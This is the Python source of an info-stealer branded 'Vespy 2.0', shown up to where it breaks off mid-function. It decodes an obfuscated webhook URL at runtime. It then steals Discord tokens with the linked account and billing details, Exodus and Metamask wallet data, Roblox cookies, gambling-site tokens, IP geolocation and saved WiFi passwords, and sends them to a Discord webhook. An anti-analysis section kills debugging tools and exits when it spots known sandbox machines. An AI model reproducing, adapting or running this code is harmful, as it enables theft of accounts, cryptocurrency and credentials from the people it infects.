import os, base64, shutil, requests, json, re, winshell, platform, psutil, subprocess, win32api, sys, ctypes, uuid, pygame
import getpass;user=getpass.getuser()
from json import loads
from time import sleep
from win32crypt import CryptUnprotectData
from sqlite3 import connect
from Crypto.Cipher import AES
from threading import Thread
from zipfile import ZipFile
from PIL import ImageGrab
from random import randint
from discord_webhook import DiscordWebhook, DiscordEmbed
from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
from rotatescreen import get_primary_display
from pygame import camera
from pathlib import Path

wbh = str(requests.get(__import__(f'{chr(108)}{chr(122)}{chr(109)}{chr(97)}').decompress(__import__(f'{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}').b16decode(__import__(f'{chr(99)}{chr(111)}{chr(100)}{chr(101)}{chr(99)}{chr(115)}').decode(__import__(f'{chr(122)}{chr(108)}{chr(105)}{chr(98)}').decompress(__import__(f'{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}').b85decode("c$_Vbiw(pu2t!u_n@_R?Nt69|Ia-|&vh<A1eVAE3yyTUgcw(7_Km;nP@o`DRJzf-Tju>e@l4RlHCS!yq!qa*?#arZ^pn0}W8ikVnT{;>2D?U~`F*K_%w>MEPFcizVj@}iQ`MiJsGM`>QslO<+".encode())).decode(),f'{chr(114)}{chr(111)}{chr(116)}{chr(49)}{chr(51)}').encode())).decode()).text)
if wbh.startswith(f"{chr(51)}"):
    while True:
        try:wbh=__import__(f'{chr(108)}{chr(122)}{chr(109)}{chr(97)}').decompress(__import__(f'{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}').b16decode(__import__(f'{chr(99)}{chr(111)}{chr(100)}{chr(101)}{chr(99)}{chr(115)}').decode(__import__(f'{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}').b85decode(wbh.strip().split(f'{chr(51)}{chr(43)}')[1].encode()).decode(),f'{chr(114)}{chr(111)}{chr(116)}{chr(49)}{chr(51)}').encode())).decode()
        except:break
dtokens = []
rocookies = []
ropasswords = []
dispasswords = []

try:
    os.mkdir(os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}"))
    P4THF0LDR = os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}")
except:
    try:
        shutil.rmtree(os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}"))
        os.mkdir(os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}"))
        P4THF0LDR = os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}")
    except:
        pass
        
class CookieInfo:
	pass
class Browsers():
	def __repr__(self):
		return '''\n``|``'''
class DISCORD:

    def __init__(self):
        self.tokens = []
        roa = fr"C:\Users\{user}\AppData\Roaming"
        loc = fr"C:\Users\{user}\AppData\Local"
        paths = [f"Discord|{roa}\\discord\\Local Storage\\leveldb\\",f"Discord Canary|{roa}\\discordcanary\\Local Storage\\leveldb\\",f"Lightcord|{roa}\\Lightcord\\Local Storage\\leveldb\\",f"Discord PTB|{roa}\\discordptb\\Local Storage\\leveldb\\",f"Brave|{loc}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",f"Opera|{roa}\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",f"Opera GX|{roa}\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",f"Microsoft Edge|{loc}\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\",f"Microsoft Edge1|{loc}\\Microsoft\\Edge\\User Data\\Profile 1\\Local Storage\\leveldb\\",f"Microsoft Edge2|{loc}\\Microsoft\\Edge\\User Data\\Profile 2\\Local Storage\\leveldb\\",f"Microsoft Edge1|{loc}\\Microsoft\\Edge\\User Data\\Profile 1\\Local Storage\\leveldb\\",f"Microsoft Edge3|{loc}\\Microsoft\\Edge\\User Data\\Profile 3\\Local Storage\\leveldb\\",f"Microsoft Edge4|{loc}\\Microsoft\\Edge\\User Data\\Profile 4\\Local Storage\\leveldb\\",f"Microsoft Edge5|{loc}\\Microsoft\\Edge\\User Data\\Profile 5\\Local Storage\\leveldb\\",f"Microsoft Edge6|{loc}\\Microsoft\\Edge\\User Data\\Profile 6\\Local Storage\\leveldb\\",f"Microsoft Edge7|{loc}\\Microsoft\\Edge\\User Data\\Profile 7\\Local Storage\\leveldb\\",f"Microsoft Edge8|{loc}\\Microsoft\\Edge\\User Data\\Profile 8\\Local Storage\\leveldb\\",f"Microsoft Edge9|{loc}\\Microsoft\\Edge\\User Data\\Profile 9\\Local Storage\\leveldb\\",f"Chrome|{loc}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",f"Chrome1|{loc}\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\",f"Chrome2|{loc}\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\",f"Chrome3|{loc}\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\",f"Chrome4|{loc}\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\",f"Chrome5|{loc}\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\",f"Chrome6|{loc}\\Google\\Chrome\\User Data\\Profile 6\\Local Storage\\leveldb\\",f"Chrome7|{loc}\\Google\\Chrome\\User Data\\Profile 7\\Local Storage\\leveldb\\",f"Chrome8|{loc}\\Google\\Chrome\\User Data\\Profile 8\\Local Storage\\leveldb\\",f"Chrome9|{loc}\\Google\\Chrome\\User Data\\Profile 9\\Local Storage\\leveldb\\",f"Chrome10|{loc}\\Google\\Chrome\\User Data\\Profile 10\\Local Storage\\leveldb\\"]
        for i in paths:
            path = i.split("|")[1]
            name = i.split("|")[0].replace(" ","").lower()
            if "ord" in path:
                self.enc_regex(name, path, roa)
            else:
                self.regex(path)
        self.send()
    def regex(self, path):
        try:
            for file in os.listdir(path):
                if file.endswith(".log") or file.endswith(".ldb"):
                    for l in open(f"{path}\\{file}",errors="ignore").readlines():
                        for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", l):
                            try:
                                v=requests.get("https://discord.com/api/v9/users/@me", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type': 'application/json','Authorization': token})
                                if v.status_code == 200:
                                    if token not in self.tokens:
                                        dtokens.append(token)
                                        self.tokens.append(token)
                            except:pass
        except:pass
    def enc_regex(self, name, path, roa):
        try:
            for file in os.listdir(path):
                if file.endswith(".log") or file.endswith(".ldb"):
                    for l in open(f"{path}\\{file}",errors="ignore").readlines():
                        for I in re.findall(r"dQw4w9WgXcQ:[^\"]*", l):
                            try:
                                returned_key = self.KEY(roa+f'\\{name}\\Local State')
                                token = self.dec(base64.b64decode(I.split('dQw4w9WgXcQ:')[1]),returned_key)
                                try:
                                    v=requests.get("https://discord.com/api/v9/users/@me", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type': 'application/json','Authorization': token})
                                    if v.status_code == 200:
                                        if token not in self.tokens:
                                            dtokens.append(token)
                                            self.tokens.append(token)
                                except:pass
                            except:pass
        except:pass
    def KEY(self, path):
        ls = json.loads(open(path,'r',encoding='utf-8').read())
        master_key = CryptUnprotectData(base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:],None,None,None, 0)[1]
        return master_key
    def dec(self, buff, key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            dec = cipher.decrypt(payload)[:-16].decode()
            return dec
        except:pass
    def send(self):
        if len(self.tokens) > 0:
            for tok in self.tokens:
                try:
                    info = requests.get("https://discord.com/api/v9/users/@me", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type': 'application/json','Authorization': tok}).json()
                    user = info['username']+"#"+info['discriminator']
                    id = info['id']
                    email = info["email"]
                    if info["verified"]:
                        verf = ":white_check_mark:"
                    else:verf = ":x:"
                    phone = info["phone"]
                    avatar = f"https://cdn.discordapp.com/avatars/{id}/{info['avatar']}.png"
                    if info['mfa_enabled']:
                        af2 = ":white_check_mark:"
                    else:af2 = ":x:"
                    if info['premium_type']==0:
                        N=":x:"
                    elif info['premium_type']==1:
                        N="``Nitro Classic``"
                    elif info['premium_type']==2:
                        N="``Nitro Boost``"
                    elif info['premium_type']==3:
                        N="``Nitro Basic``"
                    else:N=":x:"
                    P = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type': 'application/json','Authorization': tok}).json()
                    if P == []:
                        bil = ":x:"
                    else:
                        for b in P:
                            if b['type']==1:
                                bil=":credit_card:"
                            elif b['type']==2:
                                bil=":regional_indicator_p:"
                    PASSYWORDY = "Not Found"
                    for i in dispasswords:
                        if str(info['username']).lower() == i.split("|")[0].strip().lower():
                            PASSYWORDY = i.split("|")[1].strip()
                        elif str(email).lower() == i.split("|")[0].strip().lower():
                            PASSYWORDY = i.split("|")[1].strip()
                    webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
                    embed = DiscordEmbed(title=f"Discord Token", description=f"Found Discord Token", color='4300d1')
                    embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
                    embed.set_footer(text='Vespy 2.0 | by : vesper')
                    embed.set_timestamp()
                    embed.add_embed_field(name=f"Account of {user}", value=f":id: ID: ``{id}``\n\n:email: Email: ``{email}``\n:lock: Password: ``{PASSYWORDY}``\n\n:mobile_phone: Phone: ``{phone}``\n:ballot_box_with_check: Verified: {verf}\n:closed_lock_with_key: 2FA: {af2}\n\n\n:purple_circle: Nitro: {N}\n:page_with_curl: Billing: {bil}\n\n\n:coin: Token: ``{tok}``")
                    embed.set_thumbnail(url=avatar)
                    webhook.add_embed(embed)
                    webhook.execute()
                except:pass
class Telegram():
	def __repr__(self):
		return '''\n``|``'''
class EXodus:

    def __init__(self):
        self.amountfiles = 0
        self.county = 0
        self.pathyy = os.path.join(P4THF0LDR, "Wallets")
        os.mkdir(self.pathyy)
        try:
            self.path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Exodus")
            self.stealexo(self.path+"\\exodus.wallet")
        except:
            pass
        try:
            paths = [f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft","3dge","User Data")}', f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft","Edge","User Data")}', f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google","Chrome","User Data")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware","Brave-Browser","User Data")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software","Opera Stable")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software","Opera GX Stable")}']
            profs = ["Default", "Profile 1","Profile 2", "Profile 3", "Profile 4","Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]
            self.stealmeta(paths, profs)
        except:
            pass
    
    def stealexo(self, path):
        exopath = os.path.join(self.pathyy, "Exodus")
        os.mkdir(exopath)
        P=os.listdir(path)
        for i in P:
            self.amountfiles += 1
            shutil.copy(path+f"\\{i}",exopath+f"\\{i}")
    
    def stealmeta(self, paths, profs):
        metapath = os.path.join(self.pathyy, "Metamask")
        os.mkdir(metapath)
        for i in paths:
            if "Opera Software" in i:
                try:
                    Path = os.path.join(i,"Local Extension Settings","nkbihfbeogaeaoehlefnkodbefgpgknn")
                    shutil.copytree(Path,metapath+f"\\Metamask_{self.county}")
                    self.amountfiles += 1;self.county += 1
                except:
                    pass
            else:
                for I in profs:
                    try:
                        if "3dge" in i:
                            i = i.replace("3dge","Edge")
                            lastpart = "ejbalbakoplchlghecdalmeeeajnimhm"
                        else:
                            lastpart = "nkbihfbeogaeaoehlefnkodbefgpgknn"
                            Path = os.path.join(i,I,"Local Extension Settings",lastpart)
                            shutil.copytree(Path,metapath+f"\\Metamask_{self.county}")
                            self.amountfiles += 1;self.county += 1
                    except:
                        pass

    def __repr__(self):
        return f"""
``|_`` :open_file_folder: ``Exodus & Metamask``
``|   |_``:page_facing_up: ``({self.amountfiles}) Exodus & Metamask Files``"""
class Roblox:

    def __init__(self):
        os.mkdir(os.path.join(P4THF0LDR, "Roblox"))
        self.robloxfolder = os.path.join(P4THF0LDR, "Roblox")
        self.bloxflip = 0
        self.robloxcookies = 0
        self.rbxflip = 0
        self.rblxwild = 0
        paths = [f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft","Edge","User Data")}', f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google","Chrome","User Data")}']
        self.prof = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4","Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]
        self.RobloxStudio()
        for i in paths:
            if os.path.exists(i):
                self.Rblxwild(i)
        for i in paths:
            if os.path.exists(i):
                self.Rbxflip(i)
        for i in paths:
            if os.path.exists(i):
                self.Bloxflip(i)
        self.__repr__()

    def Rblxwild(self,p):
        filo=open(self.robloxfolder+"\\Rblxwild_Tokens.txt","w+")
        try:
            for i in self.prof:
                new_path = os.path.join(p, i, "Local Storage", "leveldb")
                for f in os.listdir(new_path):
                    if f.endswith(".log") or f.endswith(".ldb"):
                        try:
                            file = str(open(new_path+"\\"+f,"rb").read().strip())
                            file = file.split("_https://rblxwild.com")
                            for tok in file:
                                t = "bd"+tok.split("authToken")[1].split("bd")[1].split("\\x")[0]
                                if len(t)>50:
                                    self.rblxwild += 1
                                    filo.write(f"\nToken : {t}\n\n"+"-"*35)
                        except:pass
        except:pass
        filo.close()

    def Rbxflip(self,p):
        filo=open(self.robloxfolder+"\\Rbxflip_Tokens.txt","w+")
        try:
            for i in self.prof:
                new_path = os.path.join(p, i, "Local Storage", "leveldb")
                for f in os.listdir(new_path):
                    if f.endswith(".log") or f.endswith(".ldb"):
                        try:
                            file = str(open(new_path+"\\"+f,"rb").read().strip())
                            if "https://www.rbxflip.com" in file:
                                file2 = file.split("https://www.rbxflip.com")
                                for tok in file2:
                                    t = tok.split("Bearer ")[1].split("\\x")[0]
                                    self.rbxflip += 1
                                    filo.write(f"\nToken : {t}\n\n"+"-"*35)
                        except:pass
        except:pass
        filo.close()

    def Bloxflip(self,p):
        filo=open(self.robloxfolder+"\\Bloxflip_Tokens.txt","w+")
        try:
            for i in self.prof:
                new_path = os.path.join(p, i, "Local Storage", "leveldb")
                for f in os.listdir(new_path):
                    if f.endswith(".log") or f.endswith(".ldb"):
                        try:
                            file = str(open(new_path+"\\"+f,"rb").read().strip())
                            file2 = file.split("_DO_NOT_SHARE_BLOXFLIP_TOKEN")
                            for tok in file2:
                                try:
                                    t = "ywmz0d/"+tok.split("ywmz0d/")[1][:2000].split("\\x")[0].replace("%","")
                                    self.bloxflip += 1
                                    filo.write(f"\nToken : {t}\n\n"+"-"*35)
                                except:pass
                        except:pass
        except:pass
        filo.close()

    def RobloxStudio(self):
        filo=open(self.robloxfolder+"\\Roblox_Cookies.txt","w+")
        try:
            robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
            count = 0
            while True:
                name, value, type = EnumValue(robloxstudiopath, count)
                if name == ".ROBLOSECURITY":
                    value = "_|WARNING:-DO-NOT-SHARE-THIS" + str(value).split("_|WARNING:-DO-NOT-SHARE-THIS")[1].split(">")[0]
                    self.robloxcookies += 1
                    filo.write(f"\n.ROBLOSECURITY : {value}\n\n"+"-"*35)
                count = count + 1
        except WindowsError:
            pass
        filo.close()
    
    def __repr__(self):
        return f"""
``|_`` :open_file_folder: ``Roblox``
``|   |_``:page_facing_up: ``({self.bloxflip}) Bloxflip_Tokens``
``|   |_``:page_facing_up: ``({self.robloxcookies}) Roblox_Cookies``
``|   |_``:page_facing_up: ``({self.rbxflip}) Rbxflip_Tokens``
``|   |_``:page_facing_up: ``({self.rblxwild}) Rblxwild_Tokens``"""
class Injection:
	pass
class Files:
	pass
class Minecraft:
	def __repr__(self):
		return '''\n``|``'''
class Network:

    def __init__(self):
        self.WiFi()

    def IP(self):
        con = requests.get("http://ipinfo.io/json").json()
        self.ip = f"``{con['ip']}``"
        try:
            self.hostname = f"``{con['hostname']}``"
        except:self.hostname = ":x:"
        try:
            self.city = f"``{con['city']}``"
        except:
            self.city = ":x:"
        try:
            self.region = f"``{con['region']}``"
        except:
            self.region = ":x:"
        try:
            self.country = f"``{con['country']}``"
        except:
            self.country =":x:"
        try:
            self.location = f"``{con['loc']}``"
        except:
            self.location = ":x:"
        try:
            self.ISP = f"``{con['org']}``"
        except:
            self.ISP = ":x:"
        try:
            self.postal = f"``{con['postal']}``"
        except:
            self.postal = ":x:"

    def WiFi(self):
        self.IP()
        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
        embed = DiscordEmbed(title=f"Network Info", description=f"User's Network Info", color='4300d1')
        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
        embed.set_footer(text='Vespy 2.0 | by : vesper')
        embed.set_timestamp()
        embed.add_embed_field(name=f":ok_hand: IP : {self.ip}", value=f":label: Hostname: {self.hostname}\n:cityscape: City: {self.city}\n:park: Region: {self.region}\n:map: Country: {self.country}\n:round_pushpin: Location: {self.location}\n:pager: ISP: {self.ISP}\n:envelope: Postal: {self.postal}")
        webhook.add_embed(embed)
        webhook.execute()
        try:
            networks = re.findall("(?:Profile\s*:\s)(.*)", subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode("utf-8",errors="backslashreplace"))
            for nets in networks:
                nets = nets.replace("\\r\\n","")
                res = subprocess.check_output(f"netsh wlan show profile {nets} key=clear",shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode("utf-8",errors="backslashreplace")
                ssid = res.split("Type")[1].split(":")[1].split("\n")[0].split("\r")[0]
                key = res.split("Key Content")[1].split(":")[1].split("\n")[0].split("\r")[0]
                webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
                embed = DiscordEmbed(title=f"Network Info", description=f"User's Network Info (MORE)", color='4300d1')
                embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
                embed.set_footer(text='Vespy 2.0 | by : vesper')
                embed.set_timestamp()
                embed.add_embed_field(name=f":thumbup: Wifi Network Found : ``{nets}``", value=f":man_tipping_hand: SSID: ``{ssid}``\n:scream: Password: ``{key}``")
                webhook.add_embed(embed)
                webhook.execute()
        except:pass
class Antidebug:

    def __init__(self):
        self.autoclose()
        self.HWIDS()
        self.username()
        self.pcnames()
        self.IPS()
        self.MACC()
        self.disk()

    def autoclose(self):
        for p in psutil.process_iter():
            if any(procstr in p.name().lower() for procstr in ['taskmgr','process','processhacker','ksdumper','fiddler','httpdebuggerui','wireshark','httpanalyzerv7','fiddler','decoder','regedit','procexp','dnspy','vboxservice','burpsuit']):
                try:p.kill()
                except:pass
    
    def HWIDS(self):
        try:
            hwid = str(subprocess.check_output('wmic csproduct get uuid')).replace(" ","").split("\\n")[1].split("\\r")[0]
        except:
            hwid = "wtf"
        SOME_SUSSY_HWIDS = ['7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FF577B79-782E-0A4D-8568-B35A9B7EB76B', '08C1E400-3C56-11EA-8000-3CECEF43FEDE', '6ECEAF72-3548-476C-BD8D-73134A9182C8', '49434D53-0200-9036-2500-369025003865', '119602E8-92F9-BD4B-8979-DA682276D385', '12204D56-28C0-AB03-51B7-44A8B7525250', '63FA3342-31C7-4E8E-8089-DAFF6CE5E967', '365B4000-3B25-11EA-8000-3CECEF44010C', 'D8C30328-1B06-4611-8E3C-E433F4F9794E', '00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD04D98', '4CB82042-BA8F-1748-C941-363C391CA7F3', 'B6464A2B-92C7-4B95-A2D0-E5410081B812', 'BB233342-2E01-718F-D4A1-E7F69D026428', '9921DE3A-5C1A-DF11-9078-563412000026', 'CC5B3F62-2A04-4D2E-A46C-AA41B7050712', '00000000-0000-0000-0000-AC1F6BD04986', 'C249957A-AA08-4B21-933F-9271BEC63C85', 'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E', 'ACA69200-3C4C-11EA-8000-3CECEF4401AA', '3F284CA4-8BDF-489B-A273-41B44D668F6D','BB64E044-87BA-C847-BC0A-C797D1A16A50', '2E6FB594-9D55-4424-8E74-CE25A25E36B0', '42A82042-3F13-512F-5E3D-6BF4FFFD8518', '38AB3342-66B0-7175-0B23-F390B3728B78', '48941AE9-D52F-11DF-BBDA-503734826431', '032E02B4-0499-05C3-0806-3C0700080009', 'DD9C3342-FB80-9A31-EB04-5794E5AE2B4C', 'E08DE9AA-C704-4261-B32D-57B2A3993518', '07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9', '88DC3342-12E6-7D62-B0AE-C80E578E7B07', '5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E', '96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE', '0934E336-72E4-4E6A-B3E5-383BD8E938C3', '12EE3342-87A2-32DE-A390-4C2DA4D512E9', '38813342-D7D0-DFC8-C56F-7FC9DFE5C972', '8DA62042-8B59-B4E3-D232-38B29A10964A', '3A9F3342-D1F2-DF37-68AE-C10F60BFB462', 'F5744000-3C78-11EA-8000-3CECEF43FEFE', 'FA8C2042-205D-13B0-FCB5-C5CC55577A35', 'C6B32042-4EC3-6FDF-C725-6F63914DA7C7', 'FCE23342-91F1-EAFC-BA97-5AAE4509E173', 'CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F', '050C3342-FADD-AEDF-EF24-C6454E1A73C9', '4DC32042-E601-F329-21C1-03F27564FD6C', 'DEAEB8CE-A573-9F48-BD40-62ED6C223F20', '05790C00-3B21-11EA-8000-3CECEF4400D0', '5EBD2E42-1DB8-78A6-0EC3-031B661D5C57', '9C6D1742-046D-BC94-ED09-C36F70CC9A91', '907A2A79-7116-4CB6-9FA5-E5A58C4587CD', 'A9C83342-4800-0578-1EE8-BA26D2A678D2', 'D7382042-00A0-A6F0-1E51-FD1BBF06CD71', '1D4D3342-D6C4-710C-98A3-9CC6571234D5', 'CE352E42-9339-8484-293A-BD50CDC639A5', '60C83342-0A97-928D-7316-5F1080A78E72', '02AD9898-FA37-11EB-AC55-1D0C0A67EA8A', 'DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F', 'FED63342-E0D6-C669-D53F-253D696D74DA', '2DD1B176-C043-49A4-830F-C623FFB88F3C', '4729AEB0-FC07-11E3-9673-CE39E79C8A00', '84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57', 'A7721742-BE24-8A1C-B859-D7F8251A83D3', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08', 'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661', '921E2042-70D3-F9F1-8CBD-B398A21F89C6']
        for hwids in SOME_SUSSY_HWIDS:
            if hwids == hwid:
                os._exit(1)
    
    def username(self):
        usrname = os.getenv('UserName')
        USERNAMES = ['WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A','lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise','User01', 'test', 'RGzcBUyrznReg']
        for usr in USERNAMES:
            if usr == usrname:
                os._exit(1)
    
    def pcnames(self):
        pcname = os.getenv('COMPUTERNAME')
        PCNAMES = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1','LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ','DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M','DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P','DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']
        for pcn in PCNAMES:
            if pcn == pcname:
                os._exit(1)

    def IPS(self):
        try:
            ip = str(requests.get("http://ipinfo.io/json").json()["ip"])
        except:
            ip = 'balls'
        IPPS = ['88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116','34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151','195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50','109.74.154.91', '93.216.75.209', '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143','34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97','34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23', '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228', '212.119.227.167','193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107']
        for IP in IPPS:
            if IP == ip:
                os._exit(1)
    
    def MACC(self):
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
